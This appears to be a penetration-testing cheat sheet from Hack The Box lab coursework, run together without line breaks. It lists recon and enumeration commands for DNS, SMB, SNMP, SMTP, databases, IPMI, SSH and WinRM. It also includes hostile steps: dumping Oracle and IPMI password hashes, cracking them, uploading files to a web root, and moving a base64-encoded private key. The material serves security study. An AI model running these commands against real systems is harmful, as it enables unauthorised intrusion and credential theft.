nmap -sC -sV -p- -min-rate 1000 10.129.106.147 > nmap1.txtnmap -sU -sV -sC -p U:53,67,68,69,123,161,162,514,1194,1434,1900 10.129.106.147 > nmap2.txt---sudo sh -c "echo '94.237.51.125 inlanefreight.htb' >> /etc/hosts" --> Add domain to etc hostsopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' --> Creating Self Signed certificatewith zipfile.ZipFile('test.zip', "r") as z:  z.extractall("/home/user/directory") --> Python to unzip a .zip (Use if unzip not installed and no sudoers perms to install it)---crt.sh / search.censys.io --> SSL Certificates LogDomain.Glass --> Infrastructurebuckets.grayhatwarfare.com --> cloudweb.archive.org --> Web Archivescurl -s https://crt.sh/\?q\=foo.com\&output\=json | jq .curl -s https://crt.sh/\?q\=foo.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -ufor i in $(cat subdomainlist);do host $i | grep "has address" | grep foo.com | cut -d" " -f1,4;donefor i in $(cat subdomainlist);do host $i | grep "has address" | grep foo.com | cut -d" " -f4 >> ip-addresses.txt;donefor i in $(cat ip-addresses.txt);do shodan host $i;donedig any foo.comintext:foo inurl:amazonaws.com --> Google Search for AWSintext:foo inurl:blob.core.windows.net --> Google Search for AzureOperator	Operator Description	Example	Example Descriptionsite: --> Limits results to a specific website or domain.	site:example.com	Find all publicly accessible pages on example.com.inurl: --> Finds pages with a specific term in the URL.	inurl:login	Search for login pages on any website.filetype: --> Searches for files of a particular type.	filetype:pdf	Find downloadable PDF documents.intitle: --> Finds pages with a specific term in the title.	intitle:"confidential report"	Look for documents titled "confidential report" or similar variations.intext: or inbody: --> Searches for a term within the body text of pages.	intext:"password reset"	Identify webpages containing the term “password reset”.cache: -->Displays the cached version of a webpage (if available).	cache:example.com	View the cached version of example.com to see its previous content.link: --> Finds pages that link to a specific webpage.	link:example.com	Identify websites linking to example.com.related: --> Finds websites related to a specific webpage.	related:example.com	Discover websites similar to example.com.info: --> Provides a summary of information about a webpage.	info:example.com	Get basic details about example.com, such as its title and description.define: --> Provides definitions of a word or phrase.	define:phishing	Get a definition of "phishing" from various sources.numrange: --> Searches for numbers within a specific range.	site:example.com numrange:1000-2000	Find pages on example.com containing numbers between 1000 and 2000.allintext: --> Finds pages containing all specified words in the body text.	allintext:admin password reset	Search for pages containing both "admin" and "password reset" in the body text.allinurl: --> Finds pages containing all specified words in the URL.	allinurl:admin panel	Look for pages with "admin" and "panel" in the URL.allintitle: --> Finds pages containing all specified words in the title.	allintitle:confidential report 2023	Search for pages with "confidential," "report," and "2023" in the title.AND --> Narrows results by requiring all terms to be present.	site:example.com AND (inurl:admin OR inurl:login)	Find admin or login pages specifically on example.com.OR --> Broadens results by including pages with any of the terms.	"linux" OR "ubuntu" OR "debian"	Search for webpages mentioning Linux, Ubuntu, or Debian.NOT --> Excludes results containing the specified term.	site:bank.com NOT inurl:login	Find pages on bank.com excluding login pages.* (wildcard) --> Represents any character or word.	site:socialnetwork.com filetype:pdf user* manual	Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com... (range search) --> Finds results within a specified numerical range.	site:ecommerce.com "price" 100..500	Look for products priced between 100 and 500 on an e-commerce website." " (quotation marks) --> Searches for exact phrases.	"information security policy"	Find documents mentioning the exact phrase "information security policy".- (minus sign) --> Excludes terms from the search results.	site:news.com -inurl:sports	Search for news articles on news.com excluding sports-related content.Common Google Dorks:Here are some common examples of Google Dorks, for more examples, refer to the Google Hacking Database:Finding Login Pages:site:example.com inurl:loginsite:example.com (inurl:login OR inurl:admin)Identifying Exposed Files:site:example.com filetype:pdfsite:example.com (filetype:xls OR filetype:docx)Uncovering Configuration Files:site:example.com inurl:config.phpsite:example.com (ext:conf OR ext:cnf) (searches for extensions commonly used for configuration files)Locating Database Backups:site:example.com inurl:backupsite:example.com filetype:sql---cat /etc/vsftpd.conf | grep -v "#" --> Config Settingscat /etc/ftpusers --> Users Denied FTP Accessftp username:password@my.domain.comftp> statusftp> lsftp> ls -R --> Recursive Listingftp> get foo.txt --> download a fileftp> put foo.txt --> Upload a filewget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 --> Download all filesnc -nv 10.129.14.136 21 --> FTP Service Interactiontelnet 10.129.14.136 21 --> FTP Service Interactionopenssl s_client -connect 10.129.14.136:21 -starttls ftp --> FTP Service Interaction running with TLS/SSL---cat /etc/samba/smb.conf | grep -v "#\|\;"  --> Config Settingssmbclient -N -L //10.129.14.128 --> List sharessmbclient //10.129.14.128/foo --> connect to sharesmb: \> help --> List commandssmb: \> ls --> list filessmb: \> get foo.txt --> download filessudo nmap 10.129.14.128 -sV -sC -p139,445 --> Service footprintingrpcclient -U "" 10.129.14.128 --> connect to RPC clientrpcclient $> srvinfo --> Server informationrpcclient $> enumdomains --> Enumerate all domains that are deployed in the network.rpcclient $> querydominfo --> 	Provides domain, server, and user information of deployed domains.rpcclient $> netshareenumall--> Enumerates all available shares.rpcclient $> netsharegetinfo foo --> Provides information about a specific share.rpcclient $> enumdomusers --> Enumerates all domain users.rpcclient $> queryuser <RID> --> Provides information about a specific user.for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done --> bruteforce ridsamrdump.py 10.129.14.128 --> Enum Scriptsmbmap -H 10.129.14.128 --> Enum Toolcrackmapexec smb 10.129.14.128 --shares -u '' -p '' --> Enum Tool./enum4linux-ng.py 10.129.14.128 -A --> Enum Tool---sudo nmap 10.129.14.128 -p111,2049 -sV -sC --> Service footprintingsudo nmap --script nfs* 10.129.14.128 -sV -p111,2049 --> Nmap NSF scriptsshowmount -e 10.129.14.128 --> Show Available NFS Sharesmkdir target-NFS --> Mounting NFS Sharesudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolockcd target-NFStree .ls -l mnt/nfs/ --> List Contents with Usernames & Group Namesls -n mnt/nfs/ --> List Contents with UIDs & GUIDs---A Record --> Returns an IPv4 address of the requested domain as a result.AAAA Record --> Returns an IPv6 address of the requested domain.MX Record --> Returns the responsible mail servers as a result.NS Record --> Returns the DNS servers (nameservers) of the domain.TXT Record --> This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.CNAME Record --> This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu.PTR Record --> The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.SOA Record --> Provides information about the corresponding DNS zone and email address of the administrative contact.https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64 --> DNS Bind9 vulnshttps://web.archive.org/web/20250329174745/https://securitytrails.com/blog/most-popular-types-dns-attacks -->  Popular DNS attacksdig ns inlanefreight.htb @10.129.14.128 -->  foot printing DNSdig CH TXT version.bind 10.129.120.85 --> Version Querydig any inlanefreight.htb @10.129.14.128 --> view all recordsdig axfr inlanefreight.htb @10.129.14.128 --> AXFR Zone Transferdig axfr internal.inlanefreight.htb @10.129.14.128 --> AXFR Zone Transfer internal hostsdig domain.com --> Performs a default A record lookup for the domain.dig domain.com A --> Retrieves the IPv4 address (A record) associated with the domain.dig domain.com AAAA --> Retrieves the IPv6 address (AAAA record) associated with the domain.dig domain.com MX --> Finds the mail servers (MX records) responsible for the domain.dig domain.com NS --> Identifies the authoritative name servers for the domain.dig domain.com TXT --> Retrieves any TXT records associated with the domain.dig domain.com CNAME --> Retrieves the canonical name (CNAME) record for the domain.dig domain.com SOA --> Retrieves the start of authority (SOA) record for the domain.dig @1.1.1.1 domain.com --> Specifies a specific name server to query; in this case 1.1.1.1dig +trace domain.com --> Shows the full path of DNS resolution.dig -x 192.168.1.1 --> Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.dig +short domain.com --> Provides a short, concise answer to the query.dig +noall +answer domain.com --> Displays only the answer section of the query output.dig domain.com ANY --> Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482).for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done --> subdomain brute forcingdnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb --> subdomain brute forcingdnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txtDNS Tools:- dig- nslookup- host- dnsenum- fierce- dnsrecon- theHarvester---cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d" --> SMTP configAUTH PLAIN --> AUTH is a service extension used to authenticate the client.HELO --> The client logs in with its computer name and thus starts the session.MAIL FROM --> The client names the email sender.RCPT TO	--> The client names the email recipient.DATA --> The client initiates the transmission of the email.RSET --> The client aborts the initiated transmission but keeps the connection between client and server.VRFY --> The client checks if a mailbox is available for message transfer.EXPN --> The client also checks if a mailbox is available for messaging with this command.NOOP --> The client requests a response from the server to prevent disconnection due to time-out.QUIT --> The client terminates the session.telnet 10.129.14.128 25 --> Interact with SMTP serverCONNECT 10.129.14.128:25 HTTP/1.0 --> Command to connect through web proxymynetworks = 0.0.0.0/0 --> Open Relay Configuration: With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.sudo nmap 10.129.14.128 -sC -sV -p25 --> Footprintingsudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v --> Test for open relaywget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip --> User enumerationunzip Footprinting-wordlist.zipsmtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -t 10.129.181.79 -m 60 -w 20 --> User enumeration---IMAP Commands1 LOGIN username password --> User's login.1 LIST "" * --> Lists all directories.1 CREATE "INBOX" --> Creates a mailbox with a specified name.1 DELETE "INBOX" --> Deletes a mailbox.1 RENAME "ToRead" "Important" --> Renames a mailbox.1 LSUB "" * --> Returns a subset of names from the set of names that the User has declared as being active or subscribed.1 SELECT INBOX --> Selects a mailbox so that messages in the mailbox can be accessed.1 UNSELECT INBOX --> Exits the selected mailbox.1 FETCH <ID> all --> Retrieves data associated with a message in the mailbox.1 FETCH 1 (Body[]) --> Retrieves body of email with ID 11 CLOSE --> Removes all messages with the Deleted flag set.1 LOGOUT --> Closes the connection with the IMAP server.POP3 CommandsUSER username --> Identifies the user.PASS password --> Authentication of the user using its password.STAT --> Requests the number of saved emails from the server.LIST --> Requests from the server the number and size of all emails.RETR id	--> Requests the server to deliver the requested email by ID.DELE id	--> Requests the server to delete the requested email by ID.CAPA --> Requests the server to display the server capabilities.RSET --> Requests the server to reset the transmitted information.QUIT --> Closes the connection with the POP3 server.Dangerous Settingsauth_debug --> Enables all authentication debug logging.auth_debug_passwords --> This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.auth_verbose --> Logs unsuccessful authentication attempts and their reasons.auth_verbose_passwords --> Passwords used for authentication are logged and can also be truncated.auth_anonymous_username	--> This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC --> Imap and POP3 Footprintingcurl -k 'imaps://10.129.14.128' --user user:p4ssw0rd --> Log into servicecurl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v --> verbose option --> TLS version, SSL Cert details, banner e.t.c.openssl s_client -connect 10.129.14.128:pop3s --> pop3 interaction over sslopenssl s_client -connect 10.129.14.128:imaps --> imap interaction over ssl---cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d' --> SNMP Daemon ConfigDangerous Settingsrwuser noauth --> Provides access to the full OID tree without authentication.rwcommunity <community string> <IPv4 address> --> Provides access to the full OID tree regardless of where the requests were sent from.rwcommunity6 <community string> <IPv6 address> --> Same access as with rwcommunity with the difference of using IPv6.snmpwalk -v2c -c public 10.129.14.128 --> Footprinting SNMP servicesudo apt install onesixtyone --> Identify community strings through bruteforceonesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128sudo apt install braa --> Custom wordlist for community stringsbraa <community string>@<IP>:.1.3.6.*   # Syntaxbraa public@10.129.14.128:.1.3.6.*---cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d' --> MySQL ConfigDangerous Settingsuser --> Sets which user the MySQL service will run as.password --> Sets the password for the MySQL user.admin_address --> The IP address on which to listen for TCP/IP connections on the administrative network interface.debug --> This variable indicates the current debugging settingssql_warnings --> This variable controls whether single-row INSERT statements produce an information string ifwarnings occur.secure_file_priv --> This variable is used to limit the effect of data import and export operations.sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql* --> Enumerating MySQL Servermysql -u <user> -h 10.129.14.132 --> interaction with MySQL Servermysql -u <user> -p<password> -h 10.129.14.128Commandsmysql -u <user> -p<password> -h <IP address> --> Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.show databases; --> Show all databases.use <database>; --> Select one of the existing databases.show tables; --> Show all available tables in the selected database.show columns from <table>; --> Show all columns in the selected table.select * from <table>; --> Show everything in the desired table.select * from <table> where <column> = "<string>"; --> Search for needed string in the desired table.---sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 ESTNmap scan report for 10.129.201.248Host is up (0.15s latency).PORT     STATE SERVICE  VERSION1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM| ms-sql-ntlm-info:|   Target_Name: SQL-01|   NetBIOS_Domain_Name: SQL-01|   NetBIOS_Computer_Name: SQL-01|   DNS_Domain_Name: SQL-01|   DNS_Computer_Name: SQL-01|_  Product_Version: 10.0.17763Host script results:| ms-sql-dac:|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)| ms-sql-info:|   Windows server name: SQL-01|   10.129.201.248\MSSQLSERVER:|     Instance name: MSSQLSERVER|     Version:|       name: Microsoft SQL Server 2019 RTM|       number: 15.00.2000.00|       Product: Microsoft SQL Server 2019|       Service pack level: RTM|       Post-SP patches applied: false|     TCP port: 1433|     Named pipe: \\10.129.201.248\pipe\sql\query|_    Clustered: falseService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.52 secondsWe can also use Metasploit to run an auxiliary scanner called mssql_ping that will scan the MSSQL service and provide helpful information in our footprinting process.MSSQL Ping in Metasploit  MSSQLmsf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248rhosts => 10.129.201.248msf6 auxiliary(scanner/mssql/mssql_ping) > run[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:[+] 10.129.201.248:       -    ServerName      = SQL-01[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER[+] 10.129.201.248:       -    IsClustered     = No[+] 10.129.201.248:       -    Version         = 15.0.2000.5[+] 10.129.201.248:       -    tcp             = 1433[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedConnecting with Mssqlclient.pyIf we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (Transact-SQL). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.  MSSQLSaltmer04@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-authImpacket v0.9.22 - Copyright 2020 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(SQL-01): Line 1: Changed database context to 'master'.[*] INFO(SQL-01): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)[!] Press help for extra shell commandsSQL> select name from sys.databasesname---sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248 --> Enumerating MSSQL Servicemsf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248--> Enumerating MSSQL Service with Metasploitlocate mssqclient.pypython3 mssqlclient.py Administrator@10.129.201.248 -windows-auth --> Connecting with Mssqlclient---Orcacle TNS Config Files$ORACLE_HOME/network/admin/tnsnames.ora$ORACLE_HOME/network/admin/listener.orawget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zipwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zipsudo mkdir -p /opt/oraclesudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zipsudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zipexport LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATHexport PATH=$LD_LIBRARY_PATH:$PATHsource ~/.bashrccd ~git clone https://github.com/quentinhardy/odat.gitcd odat/pip install python-libnmapgit submodule initgit submodule updatepip3 install cx_Oraclesudo apt-get install python3-scapy -ysudo pip3 install colorlog termcolor passlib python-libnmapsudo apt-get install build-essential libgmp-dev -ypip3 install pycryptodome --> Instakk packages for TNS listener enumeration./odat.py -h --. Testing ODATsudo nmap -p1521 -sV 10.129.204.235 --open --> Enumerate the TNS servicesudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute --> Enumerate / Brutforce SID./odat.py all -s 10.129.204.235 --> Enumerate TNS Servicesqlplus scott/tiger@10.129.204.235/XE --> Connect to databasesudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig --> If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please executesqlplus scott/tiger@10.129.204.235/XE as sysdba --> login as DB AdminSQL> select name, password from sys.user$; --> Extract password hashesecho "Oracle File Upload Test" > testing.txt./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt --> Upload filecurl -X GET http://10.129.204.235/testing.txt --> Test file upload---sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local --> Footprinting IPMI Servicemsf6 > use auxiliary/scanner/ipmi/ipmi_versionmsf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195msf6 auxiliary(scanner/ipmi/ipmi_version) > show options  --> Metasploit Version ScanDefault PasswordsProduct	Username	PasswordDell iDRAC	root	calvinHP iLO	Administrator	randomized 8-character string consisting of numbers and uppercase lettersSupermicro IPMI	ADMIN	ADMINhashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u  --> Crack user password hashes (All ombinations of upper case letters and numbers for an eight-character password.)msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashesmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options --> Metasploit hash dumping---Dangerous Settings --> SSHPasswordAuthentication yes --> Allows password-based authentication.PermitEmptyPasswords yes --> Allows the use of empty passwords.PermitRootLogin yes --> Allows to log in as the root user.Protocol 1 --> Uses an outdated version of encryption.X11Forwarding yes --> Allows X11 forwarding for GUI applications.AllowTcpForwarding yes --> Allows forwarding of TCP ports.PermitTunnel --> Allows tunneling.DebianBanner yes --> Displays a specific banner when logging in.git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit./ssh-audit.py 10.129.14.132 --> Footprinting SSH servicessh -v cry0l1t3@10.129.14.132 --> Change authentication methodssh -i private.key <user>@<FQDN/IP> --> SSH with private keychmod 600 id_rsa --> allowed permissions for private keyhttps://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html --> Resync Exploit guidesudo nmap -sV -p 873 127.0.0.1 --> scanning for rsyncnc -nv 127.0.0.1 873 --> probing for accessible sharesrsync -av --list-only rsync://127.0.0.1/dev --> Enumerating open sharescat /etc/hosts.equiv --> List of trusted hostssudo nmap -sV -p 512,513,514 10.0.17.2 --> Scanning for R-Servicesrlogin 10.0.17.2 -l htb-student --> Logging in Using Rloginrwho --> Listing Authenticated Users Using Rwhorusers -al 10.0.17.5 --> Listing Authenticated Users Using Rusersnmap -sV -sC 10.129.201.248 -p3389 --script rdp* --> Footprinting RDPsudo cpan --> RDP Security Check Installationgit clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check./rdp-sec-check.pl 10.129.201.248 --> RDP Security Checkxfreerdp, rdesktop, or Remmina --> Connect through RDPxfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n --> Footprinting WinRMevil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD! --> Connect WinRM (Powershell commands)/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname" --> Connect with WMI---whois inlanefreight.com --> using WHOIS---gobuster vhost -u http://<target_IP_address> -w <wordlist_file> --append-domain --> Virtual Host Enumerationgobuster vhost -u http://inlanefreight.htb:80 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domaincurl -I https://inlanefreight.com --> Banner Grabbingpip3 install git+https://github.com/EnableSecurity/wafw00fwafw00f inlanefreight.com --> Check if using WAFssudo apt update && sudo apt install -y perl --> install niktogit clone https://github.com/sullo/niktocd nikto/programchmod +x ./nikto.plnikto -h inlanefreight.com -Tuning b --> Fingerprint using Nikto-s http://app.inlanefreight.local/index.php | grep '<meta name="generator"' --> Discorver which CMS UsesWell Known URIs --> Description, Status, Reference:security.txt --> Contains contact information for security researchers to report vulnerabilities.	Permanent	RFC 9116/.well-known/change-password --> Provides a standard URL for directing users to a password change page.	Provisional	https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uriopenid-configuration --> Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol.	Permanent	http://openid.net/specs/openid-connect-discovery-1_0.htmlassetlinks.json --> Used for verifying ownership of digital assets (e.g., apps) associated with a domain.	Permanent	https://github.com/google/digitalassetlinks/blob/master/well-known/specification.mdmta-sts.txt	Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.	Permanent	RFC 8461pip3 install scrapy --> Installing Scrapy Web Crawlerwget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip --> Installing ReconSpiderunzip ReconSpider.zippython3 ReconSpider.py http://inlanefreight.com --> Running reconspiderReconSpider json Output:emails --> Lists email addresses found on the domain.links --> Lists URLs of links found within the domain.external_files --> Lists URLs of external files such as PDFs.js_files --> Lists URLs of JavaScript files used by the website.form_fields --> Lists form fields found on the domain (empty in this example).images --> Lists URLs of images found on the domain.videos --> Lists URLs of videos found on the domain (empty in this example).audio --> Lists URLs of audio files found on the domain (empty in this example).comments --> Lists HTML comments found in the source code.git clone https://github.com/thewhiteh4t/FinalRecon.git --> Installing final reconcd FinalReconpip3 install -r requirements.txtchmod +x ./finalrecon.py./finalrecon.py --helpFinal Recon Commands:Option	Argument	Description-h, --help --> 	Show the help message and exit.--url --> URL	Specify the target URL.--headers --> 	Retrieve header information for the target URL.--sslinfo --> 	Get SSL certificate information for the target URL.--whois	--> 	Perform a Whois lookup for the target domain.--crawl-->	Crawl the target website.--dns -->	Perform DNS enumeration on the target domain.--sub -->	Enumerate subdomains for the target domain.--dir -->	Search for directories on the target website.--wayback --> 	Retrieve Wayback URLs for the target.--ps -->	Perform a fast port scan on the target.--full -->	Perform a full reconnaissance scan on the target../finalrecon.py --headers --whois --url http://inlanefreight.com --> Running finalrecon---md5sum id_rsa --> MD5 Hash check (Linux)cat id_rsa |base64 -w 0;echo --> Base64 encode (Linux)echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rs --> Decode Base64(Linux)[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4N